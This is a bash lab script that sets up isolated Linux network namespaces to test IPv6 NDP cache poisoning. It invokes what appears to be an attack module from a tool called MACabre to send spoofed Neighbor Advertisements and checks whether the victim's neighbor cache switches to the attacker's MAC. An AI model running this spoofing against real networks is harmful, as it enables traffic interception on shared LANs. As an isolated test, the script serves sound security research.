#!/usr/bin/env bash
# Isolated NDP cache poisoning lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge:
#
#   victim:   a host with an address on the segment. It will talk to the peer.
#   peer:     the legitimate host the victim knows, at PEER_ADDR with PEER_MAC.
#   attacker: a host that sends unsolicited Neighbor Advertisements with MACabre's module, binding
#             PEER_ADDR to ATTACKER_MAC.
#
# Phases:
#   Phase 0 (setup): the victim pings the peer, so it learns the peer's MAC into its neighbor cache. The
#            cache entry must hold PEER_MAC. If not, the lab cannot tell anything and exits 2.
#   Phase 1 (control): no NA has been sent. The entry still holds PEER_MAC.
#   Phase 2 (attack): the attacker sends NAs for PEER_ADDR with the Override flag. The entry must now
#            hold ATTACKER_MAC.
#
# Exit 0 when the control holds and the victim's entry for the peer changed to the attacker's MAC.
# Exit 1 when the entry did not change. Exit 2 when the setup or control failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/ndp_cache_poisoning_lab.sh
#
# Requirements: iproute2 (ip), ping with IPv6 support, IPv6 in the kernel, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

if [[ ! -e /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
VICTIM_MAC="02:00:00:00:10:02"
PEER_MAC="02:00:00:00:10:04"
ATTACKER_MAC="02:00:00:00:10:03"
VICTIM_ADDR="2001:db8:c0::1"
PEER_ADDR="2001:db8:c0::2"
PREFIX_LEN=64

stop_lab() {
    for ns in lan victim peer attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add victim
ip netns add peer
ip netns add attacker

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up

# attach_host NAME NAMESPACE MAC IPV6: one veth from the bridge into the namespace, with a static address.
attach_host() {
    local name="$1" ns="$2" mac="$3" addr="$4"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
    ip netns exec "$ns" ip -6 addr add "$addr/$PREFIX_LEN" dev "h-$name" nodad
}

attach_host vic victim "$VICTIM_MAC" "$VICTIM_ADDR"
attach_host peer peer "$PEER_MAC" "$PEER_ADDR"
attach_host atk attacker "$ATTACKER_MAC" "2001:db8:c0::3"

SEND_CODE='
import sys, threading
from macabre.attacks.ndp_cache_poisoning import NdpCachePoisoningConfig, run_ndp_cache_poisoning
stats = run_ndp_cache_poisoning(
    NdpCachePoisoningConfig(iface=sys.argv[1], source_mac=sys.argv[2], target=sys.argv[3], frames=3),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

# Prints the link-layer address the victim's neighbor cache holds for PEER_ADDR, or "none".
cached_mac() {
    local line
    line="$(ip netns exec victim ip -6 neigh show dev h-vic "$PEER_ADDR" 2>/dev/null | head -n1)"
    if [[ "$line" =~ lladdr\ ([0-9a-f:]{17}) ]]; then
        echo "${BASH_REMATCH[1]}"
    else
        echo none
    fi
}

echo "Phase 0: setup, the victim pings the peer to learn its MAC"
ip netns exec victim ping -6 -c 2 -W 2 "$PEER_ADDR" >/dev/null 2>&1 || true
sleep 1
SETUP="$(cached_mac)"
echo "  victim neighbor cache for $PEER_ADDR: $SETUP (peer MAC: $PEER_MAC)"
echo

echo "Phase 1: control, no Neighbor Advertisement sent"
BASE="$(cached_mac)"
echo "  victim neighbor cache for $PEER_ADDR: $BASE"
echo

echo "Phase 2: attacker sends unsolicited Neighbor Advertisements binding $PEER_ADDR to $ATTACKER_MAC, with MACabre's module"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$SEND_CODE" h-atk "$ATTACKER_MAC" "$PEER_ADDR" 2>/dev/null || echo 0)"
echo "  advertisements sent: $SENT"
sleep 2
AFTER="$(cached_mac)"
echo "  victim neighbor cache for $PEER_ADDR: $AFTER"
echo

if [[ "$SETUP" != "$PEER_MAC" ]]; then
    echo "Setup: the victim did not learn the peer's MAC. Result unreliable."
    exit 2
fi
if [[ "$BASE" != "$PEER_MAC" ]]; then
    echo "Control: the victim's entry changed before the attack. Result unreliable."
    exit 2
fi
if [[ "$AFTER" == "$ATTACKER_MAC" ]]; then
    echo "Result: the victim's neighbor cache for $PEER_ADDR now points to the attacker ($ATTACKER_MAC). Vulnerable: unsolicited Neighbor Advertisements replace valid entries without authentication."
    exit 0
fi
echo "Result: the victim's neighbor cache did not change to the attacker ($AFTER). Not validated."
exit 1
